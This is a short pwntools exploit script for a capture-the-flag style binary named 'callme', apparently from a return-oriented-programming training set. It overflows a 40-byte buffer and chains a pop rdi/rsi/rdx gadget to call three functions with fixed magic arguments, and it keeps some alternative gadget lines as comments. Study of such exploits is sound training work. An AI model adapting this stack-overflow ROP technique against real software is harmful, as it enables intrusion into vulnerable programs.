from pwn import *
context.log_level='debug'
binary = './callme'
elf = context.binary = ELF(binary)
rop = ROP(binary)
p = process(binary)
prompt = '> '

dead = 0xdeadbeefdeadbeef
cafe = 0xcafebabecafebabe
dood = 0xd00df00dd00df00d
# although the variables are read on the stack and you could just
# offset to variable,
# it's kind of better to pass in the arguments through the argument registers
# pop rdi, rsi, rdx
gadget = rop.rdi_rsi_rdx.address

log.info(f"triplerop gadget is {hex(rop.rdi_rsi_rdx.address)}")
log.info(f"location of callme_one {hex(elf.plt.callme_one)}")

p.sendlineafter(prompt, flat(
	"A"*40,
#	rop.ret.address,
#	rop.rdi.address, dead,
#	rop.ret.address,
#	rop.rsi.address, cafe,
#	rop.ret.address,
#	rop.rdx.address, dood,
	gadget, dead, cafe, dood, # when passing multiple arguments, stack may need to be aligned after each register is set
	elf.plt.callme_one,
	gadget, dead, cafe, dood,
	elf.plt.callme_two,
	gadget, dead, cafe, dood,
	elf.plt.callme_three,
))

p.interactive()
